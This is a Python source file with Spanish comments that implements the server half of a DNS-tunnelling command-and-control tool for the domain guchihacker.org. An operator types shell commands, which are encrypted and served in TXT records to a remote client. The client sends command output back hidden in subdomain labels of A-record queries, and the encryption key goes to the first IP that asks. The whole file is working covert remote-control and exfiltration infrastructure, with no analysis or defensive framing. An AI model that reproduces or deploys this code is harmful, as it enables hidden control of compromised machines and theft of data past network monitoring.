import socketserver
from dnslib import DNSRecord, QTYPE, RR, TXT, A
import threading
import re
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import os
import sys


def hex_encode_utf8(s):
    if isinstance(s, str):
        return s.encode("utf-8").hex()
    return s.hex()

def hex_decode_utf8(s):
    try:
        return bytes.fromhex(s)
    except ValueError as e:
        print(f"[ERROR DECODIFICANDO HEX]: {e}")
        return None

# Configuración
DOMINIO_BASE = "guchihacker.org" # Domain for the server
CMD_SUBDOMINIO = f"cmd.{DOMINIO_BASE}" # Command subdomain
OUTPUT_SUBDOMINIO = f"output.{DOMINIO_BASE}" # Output subdomain
CIPHER_SUBDOMINIO = f"cipher.{DOMINIO_BASE}" # Crypto subdomain
IP_FAKE = "127.0.0.1"  # Response IP for the A dns requests

# Tamaños máximos
MAX_TXT_LEN = 255  # Máximo por fragmento TXT
MAX_LABEL_LEN = 63  # Máximo por etiqueta de subdominio
MAX_DOMAIN_LEN = 255  # Máximo total de nombre de dominio

# Estado global del comando
comando_actual = None
comando_lock = threading.Lock()
comando_event = threading.Event()
cliente_conectado = threading.Event()  # Nuevo evento para controlar la conexión del cliente
comando_id = 0
comando_fragmentos = []
tramas_comando = 0  # Contador de tramas del comando enviado
ip_autorizada = None  # IP que se autoriza al solicitar el cipher
cipher_autorizado = False  # Flag para saber si ya se autorizó una IP

# Para reensamblar outputs
outputs_pendientes = {}
outputs_lock = threading.Lock()
tramas_respuesta = 0  # Contador de tramas de respuesta recibidas

# Cifrado
KEY = os.urandom(32)
NONCE = os.urandom(12)
cipher = ChaCha20Poly1305(KEY)
cipher_fragmentos = [
    f"total-2-{hex_encode_utf8(KEY)}",
    hex_encode_utf8(NONCE)
]

def encrypt_message(msg):
    return cipher.encrypt(NONCE, msg.encode('utf-8'), None)

def decrypt_message(ciphertext):
    try:
        return cipher.decrypt(NONCE, ciphertext, None).decode('utf-8', errors='replace')
    except Exception as e:
        print(f"[ERROR DECODIFICANDO OUTPUT]: {e}")
        return None

def fragmentar_mensaje_nuevo(mensaje, max_len, encrypt=True):
    if encrypt:
        mensaje = encrypt_message(mensaje)
        if mensaje is None:
            return []
    hex_str = hex_encode_utf8(mensaje)
    partes = [hex_str[i:i+max_len] for i in range(0, len(hex_str), max_len)]
    if len(partes) > 1:
        partes[0] = f"total-{len(partes)}-{partes[0]}"
    return partes

def reensamblar_fragmentos_nuevo(frags, decrypt=True):
    if not frags:
        return ""
    lista_ordenada = [""] * len(frags)
    total = len(frags)
    for frag in frags:
        if frag.startswith("total-"):
            try:
                _, num, real = frag.split("-", 2)
                total = int(num)
                lista_ordenada = [""] * total
                lista_ordenada[0] = real
            except Exception as e:
                print(f"[ERROR] Formato inválido en fragmento total: {e}")
                return ""
        else:
            idx = len([x for x in lista_ordenada if x])
            if idx < len(lista_ordenada):
                lista_ordenada[idx] = frag
    
    hex_str = ''.join(lista_ordenada)
    try:
        mensaje = hex_decode_utf8(hex_str)
        if mensaje is None:
            return ""
        if decrypt:
            return decrypt_message(mensaje)
        return mensaje
    except Exception as e:
        print(f"[ERROR] Error decodificando mensaje: {e}")
        return ""

# Variable global para el servidor
server = None

# Función para convertir hex a IP
def hex_to_ip(hex_str):
    try:
        # Asegurarse de que tenemos 8 caracteres hex (4 bytes para IP)
        hex_str = hex_str.zfill(8)
        # Convertir cada par de caracteres hex a un número y formar la IP
        octetos = []
        for i in range(0, 8, 2):
            try:
                octeto = int(hex_str[i:i+2], 16)
                # Asegurar que el valor esté en el rango 0-255
                octeto = max(0, min(255, octeto))
                octetos.append(octeto)
            except ValueError:
                # Si no se puede convertir, usar 0
                octetos.append(0)
        return '.'.join(map(str, octetos))
    except Exception as e:
        print(f"[ERROR] Error en hex_to_ip con '{hex_str}': {e}")
        return "0.0.0.0"

def input_thread():
    global comando_actual, comando_id, comando_fragmentos, ip_autorizada, cipher_autorizado
    # Esperar a que el cliente se conecte y reciba el cipher
    print("[*] Esperando a que el cliente se conecte...")
    cliente_conectado.wait()
    print("[+] Cliente conectado. Listo para enviar comandos.")
    print("[INFO] Comandos especiales:")
    print("  - 'cipher': Mostrar información del cipher")
    print("  - 'reset': Resetear autorización de IP")
    print("  - 'status': Mostrar estado actual")
    print("  - 'exit': Salir y cerrar el servidor y cliente")
    
    while True:
        try:
            comando_event.clear()
            print("[COMMAND]: ", end='', flush=True)
            cmd = input().strip()
            if cmd:  # Solo procesar si hay un comando
                # Comandos especiales
                if cmd.lower() == 'cipher':
                    print(f"[INFO] IP autorizada: {ip_autorizada}")
                    print(f"[INFO] Cipher autorizado: {cipher_autorizado}")
                    print(f"[INFO] Fragmentos del cipher:")
                    for i, frag in enumerate(cipher_fragmentos, 1):
                        print(f"  {i}. {frag}")
                    continue
                elif cmd.lower() == 'reset':
                    ip_autorizada = None
                    cipher_autorizado = False
                    print("[INFO] Autorización reseteada. Esperando nueva conexión...")
                    cliente_conectado.clear()
                    cliente_conectado.wait()
                    print("[+] Nueva IP autorizada conectada.")
                    continue
                elif cmd.lower() == 'status':
                    print(f"[INFO] IP autorizada: {ip_autorizada}")
                    print(f"[INFO] Cipher autorizado: {cipher_autorizado}")
                    print(f"[INFO] Cliente conectado: {cliente_conectado.is_set()}")
                    continue
                
                with comando_lock:
                    comando_actual = cmd
                    comando_fragmentos.clear()
                # Si el comando es exit, esperar la respuesta y luego salir
                if cmd.lower() == 'exit':
                    comando_event.wait()  # Esperar a que el cliente reciba el comando
                    print("[INFO] Cerrando servidor...")
                    os._exit(0)  # Forzar cierre del servidor
                else:
                    # Esperar a que llegue la respuesta del cliente
                    comando_event.wait()
        except EOFError:
            continue
        except KeyboardInterrupt:
            print("\n[INFO] Cerrando servidor...")
            os._exit(0)

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        global comando_actual, comando_id, comando_fragmentos, server, tramas_respuesta, ip_autorizada, cipher_autorizado
        data, sock = self.request
        request = DNSRecord.parse(data)
        reply = request.reply()
        qname = str(request.q.qname).rstrip('.')
        qtype = QTYPE[request.q.qtype]
        #print(f"[DEBUG] Recibida consulta DNS - Tipo: {qtype}, Nombre: {qname}")

        # Responder a TXT para n.cipher.<dominio>
        cipher_regex = re.compile(r"^(\d+)\.cipher\.%s$" % re.escape(DOMINIO_BASE))
        m = cipher_regex.match(qname)
        if qtype == "TXT" and m:
            try:
                idx = int(m.group(1)) - 1  # 1-based to 0-based
                if 0 <= idx < len(cipher_fragmentos):
                    # Solo permitir acceso al cipher si no hay IP autorizada o es la misma IP
                    if ip_autorizada is None or self.client_address[0] == ip_autorizada:
                        fragment = str(cipher_fragmentos[idx])
                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT([fragment])))
                        # Si es el primer fragmento del cipher, autorizar esta IP
                        if idx == 0 and ip_autorizada is None:
                            ip_autorizada = self.client_address[0]
                            cipher_autorizado = True
                            print(f"[INFO] IP autorizada: {ip_autorizada}")
                        # Si es el último fragmento del cipher, marcar al cliente como conectado
                        if idx == len(cipher_fragmentos) - 1:
                            cliente_conectado.set()
                    else:
                        # IP no autorizada intentando obtener el cipher
                        print(f"[WARNING] Intento de acceso al cipher desde IP no autorizada: {self.client_address[0]}")
                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT([""])))
                else:
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT([""])))
            except ValueError as e:
                print(f"[ERROR] Error procesando índice: {e}")
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT([""])))
            try:
                sock.sendto(reply.pack(), self.client_address)
            except OSError as e:
                print(f"[ERROR] Error enviando respuesta: {e}")
            return

        # Verificar si la IP está autorizada para comandos
        if ip_autorizada and self.client_address[0] != ip_autorizada:
            print(f"[WARNING] Intento de acceso no autorizado desde {self.client_address[0]}")
            reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT([""])))
            try:
                sock.sendto(reply.pack(), self.client_address)
            except OSError:
                pass
            return

        # Responder a TXT para n.cmd.<dominio>
        cmd_regex = re.compile(r"^(\d+)\.cmd\.%s$" % re.escape(DOMINIO_BASE))
        m = cmd_regex.match(qname)
        if qtype == "TXT" and m:
            idx = int(m.group(1)) - 1  # 1-based to 0-based
            with comando_lock:
                if comando_actual:
                    if not comando_fragmentos:
                        comando_fragmentos[:] = fragmentar_mensaje_nuevo(comando_actual, MAX_TXT_LEN - 20)
                        tramas_comando = len(comando_fragmentos)  # Actualizar contador
                        print(f"[INFO] Comando dividido en {tramas_comando} tramas")
                    if 0 <= idx < len(comando_fragmentos):
                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT([comando_fragmentos[idx]])))
                    else:
                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT([""])))
                else:
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT([""])))
            try:
                sock.sendto(reply.pack(), self.client_address)
            except OSError:
                pass
            return

        # Verificar si la IP está autorizada para respuestas
        if ip_autorizada and self.client_address[0] != ip_autorizada:
            print(f"[WARNING] Intento de respuesta no autorizada desde {self.client_address[0]}")
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.0")))
            try:
                sock.sendto(reply.pack(), self.client_address)
            except OSError:
                pass
            return

        # Recibir output del cliente (ahora usando registros A)
        output_regex = re.compile(r"^([^.]+)\.(\d+)\.output\.%s$" % re.escape(DOMINIO_BASE))
        m = output_regex.match(qname)
        if qtype == "A" and m:
            data = m.group(1)
            idx = int(m.group(2))
            tramas_respuesta += 1  # Incrementar contador de tramas recibidas
            try:
                with outputs_lock:
                    idmsg = f"{self.client_address[0]}:{comando_id}"
                    if idmsg not in outputs_pendientes:
                        outputs_pendientes[idmsg] = []
                    
                    # Si es el primer fragmento (data-total-hex)
                    if idx == 1 and data.startswith("data-"):
                        _, total_str, hex_data = data.split("-", 2)
                        total = int(total_str)
                        outputs_pendientes[idmsg].append((1, hex_data))
                        outputs_pendientes[idmsg].append(("_total", total))
                    else:
                        outputs_pendientes[idmsg].append((idx, data))
                    
                    print(f"[FRAGMENTO {idx}] {data}") # Debug
                    
                    # Comprobar si tenemos todos los fragmentos
                    total_frag = None
                    for t in outputs_pendientes[idmsg]:
                        if isinstance(t[0], str) and t[0] == "_total":
                            total_frag = t[1]
                            break
                    
                    if total_frag is not None and len([x for x in outputs_pendientes[idmsg] if isinstance(x[0], int)]) == total_frag:
                        # Mensaje completo
                        frags = sorted([x for x in outputs_pendientes[idmsg] if isinstance(x[0], int)], key=lambda x: x[0])
                        data_list = [x[1] for x in frags]
                        output = reensamblar_fragmentos_nuevo(data_list)
                        if output:
                            print(f"\n[OUTPUT] (Recibidas {total_frag} tramas)")
                            print(f"{output}")
                            if output.strip() == '__EXIT__':
                                print('[INFO] El cliente ha solicitado el cierre. Cerrando servidor...')
                                if server is not None:
                                    server.shutdown()
                                    server.server_close()
                                return
                        del outputs_pendientes[idmsg]
                        # Limpiar comando después de recibir output y avisar al input
                        with comando_lock:
                            comando_actual = None
                            comando_id += 1
                            comando_fragmentos.clear()
                        comando_event.set()
            except Exception as e:
                print(f"[ERROR] Error procesando output: {e}")
            
            # Generar una IP de respuesta basada en el fragmento recibido
            try:
                # Tomar los primeros 8 caracteres del fragmento (o rellenar con ceros)
                hex_fragment = data[:8].ljust(8, '0')
                ip = hex_to_ip(hex_fragment)
                reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip)))
            except Exception as e:
                print(f"[ERROR] Error generando IP de respuesta: {e}")
                reply.add_answer(RR(qname, QTYPE.A, rdata=A("0.0.0.0")))
            
            try:
                sock.sendto(reply.pack(), self.client_address)
            except OSError:
                pass
            return

        # Responder con IP falsa por defecto para consultas A
        if qtype == "A":
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(IP_FAKE)))
            try:
                sock.sendto(reply.pack(), self.client_address)
            except OSError:
                pass
            return

        # Responder vacío para otros casos
        try:
            sock.sendto(reply.pack(), self.client_address)
        except OSError:
            pass

def main():
    global server
    try:
        print("[+] Iniciando servidor DNS...")
        server = socketserver.ThreadingUDPServer(('0.0.0.0', 53), DNSHandler)
        print("[+] Servidor DNS escuchando en puerto 53 para el dominio", DOMINIO_BASE)
        print("[*] Esperando a que el cliente se conecte y obtenga la clave...")
        
        # Iniciar el hilo de input
        hilo_input = threading.Thread(target=input_thread, daemon=True)
        hilo_input.start()
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n[+] Recibida señal de interrupción. Cerrando servidor...")
        finally:
            if server:
                server.shutdown()
                server.server_close()
                print("[+] Servidor cerrado correctamente")
    except PermissionError:
        print("[ERROR] No se pudo iniciar el servidor DNS. Se requieren privilegios de administrador para usar el puerto 53.")
        sys.exit(1)
    except OSError as e:
        if e.errno == 10048:  # Puerto en uso
            print("[ERROR] El puerto 53 ya está en uso. Asegúrate de que no haya otro servidor DNS ejecutándose.")
        else:
            print(f"[ERROR] Error al iniciar el servidor: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Error inesperado: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 